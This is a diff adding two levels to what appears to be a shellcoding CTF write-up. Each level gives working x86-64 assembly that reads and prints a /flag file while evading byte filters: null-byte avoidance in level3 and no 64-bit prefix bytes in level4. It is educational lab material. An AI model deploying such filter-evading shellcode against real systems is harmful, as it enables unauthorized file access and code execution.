@@ -93,3 +93,79 @@ flag:
 ```
 
 ### level3
+
+- Reference: https://www.youtube.com/watch?v=QYlJd_0hRmI&list=PL-ymxv0nOtqrx3u1ZH3J9keH1ZgK8wJXF&index=7
+
+This level requires us not to have any `00` byte in our shellcode. Using `xor` trick to zero out the bits is the technique I used the most often. The hardest part was moving `/flag\0` characters into `rdi`. I referred to the office hour videos for that. What he did was building the string character by character in the stack. 
+
+```asm
+.global _start
+.intel_syntax noprefix
+_start:
+    xor rax, rax
+    mov al, 2
+    mov byte ptr [rsp], '/'
+    mov byte ptr [rsp+1], 'f'
+    mov byte ptr [rsp+2], 'l'
+    mov byte ptr [rsp+3], 'a'
+    mov byte ptr [rsp+4], 'g'
+    xor cl, cl
+    mov byte ptr [rsp+5], cl
+    mov rdi, rsp
+    xor rsi, rsi
+    syscall
+    mov rdi, rax
+    mov rsi, rsp
+    xor rdx, rdx
+    mov dl, 100
+    xor rax, rax
+    syscall
+    xor rdi, rdi
+    mov dil, 1
+    mov rsi, rsp
+    mov rdx, rax
+    xor rax, rax
+    mov al, 1
+    syscall
+    xor rax, rax
+    mov al, 60
+    syscall
+```
+
+# level4
+
+- Credit: Thank you `connojd`!
+
+This level requires me not to use any H-bytes, meaning no 64-bit operations. Well for the most parts, that's easy, we can just use 32-bit registers. However, carrying the `/flag\0` string around was the hardest part here. A nice fella on Discord helped me out greatly on this one. I just pushed necessary char bytes to the stack, and used `push rsp`, `pop REG` consecutively to imitate `mov REG, rsp`. Here `REG` is any 64-bit register you want. 
+
+```
+.global _start
+.intel_syntax noprefix
+_start:
+    mov eax, 2
+    mov cx, 0x0067
+    push cx
+    mov cx, 0x616c
+    push cx
+    mov cx, 0x662f
+    push cx
+    push rsp
+    pop rdi
+    mov esi, 0
+    syscall
+    mov edi, eax
+    push rsp
+    pop rsi
+    mov edx, 100
+    mov eax, 0
+    syscall
+    mov edi, 1
+    push rsp
+    pop rsi
+    mov edx, eax
+    mov eax, 1
+    syscall
+    mov eax, 60
+    syscall
+```
+
